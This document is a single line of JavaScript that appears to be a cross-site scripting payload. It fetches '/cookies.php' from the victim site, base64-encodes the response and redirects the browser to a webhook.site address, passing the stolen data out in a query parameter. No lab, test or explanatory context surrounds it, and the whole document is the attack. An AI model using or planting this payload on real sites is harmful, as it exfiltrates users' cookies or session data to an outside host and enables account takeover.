
fetch('/cookies.php').then(response => response.text()).then(text => window.location.href =`https://webhook.site/95b7f1e1-b976-493b-8573-7d236067214f?cz=${btoa(text)}`);
